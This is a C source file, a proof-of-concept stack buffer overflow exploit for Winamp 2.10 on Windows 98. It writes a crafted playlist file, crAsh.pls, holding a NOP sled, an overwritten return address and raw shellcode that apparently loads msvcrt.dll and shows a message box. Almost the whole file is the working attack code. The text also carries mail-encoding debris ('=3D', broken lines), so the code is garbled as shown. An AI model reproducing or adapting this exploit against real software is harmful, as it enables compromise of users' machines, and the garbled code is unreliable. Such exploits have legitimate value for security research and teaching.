/* Stack based buffer overflow exploit for Winamp v2.10
 * Author Steve Fewer, 04-01-2k. Mail me at darkplan@oceanfree.net
 *
 * For a detailed description on the exploit see my advisory.
 *
 * Tested with Winamp v2.10 using Windows98 on an Intel
 * PII 400 with 128MB RAM
 *
 * http://indigo.ie/~lmf
 */

#include <stdio.h>

int main()
{

    printf("\n\n\t\t.......................................\n");
    printf("\t\t......Nullsoft Winamp 2.10 exploit.....\n");
    printf("\t\t.......................................\n");
    printf("\t\t.....Author: Steve Fewer, 04-01-2k.....\n");
    printf("\t\t.........http://indigo.ie/~lmf.........\n");
    printf("\t\t.......................................\n\n");

char buffer[640];
char eip[8] =3D "\xF7\xCF\xB9\xBF";
char sploit[256] =3D =
"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53
\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\=
xFA\x2E\xC6
\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA\xD4\x76\xF7\xbF\x52\x8D\=
x45\xF4\x50
\xFF\x55\xF0\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x48\xC6\x45\xFD\x69\xC6\=
x45\xFE\x21
\xBA\x2E\x41\xF5\xBF\x52\x57\x8D\x55\xFC\x52\x52\x57\xFF\x55\xF8\x55\x8B\=
xEC\xBA\xFF
\xFF\xFF\xFF\x81\xEA\xFB\xAA\xFF\x87\x52\x33\xC0\x50\xFF\x55\xFC";

FILE *file;

    for(int x=3D0;x<580;x++)
    {
    buffer[x] =3D 0x90;
    }

file =3D fopen("crAsh.pls","wb");

fprintf(file, "[playlist]\n");
fprintf(file, "File1=3D");
fprintf(file, "%s", buffer);
fprintf(file, "%s", eip);
fprintf(file, "%s", sploit);
fprintf(file, "\nNumberOfEntries=3D1");

fclose(file);
printf("\t     created file crAsh.pls loaded with the exploit.\n");
return 0;
}

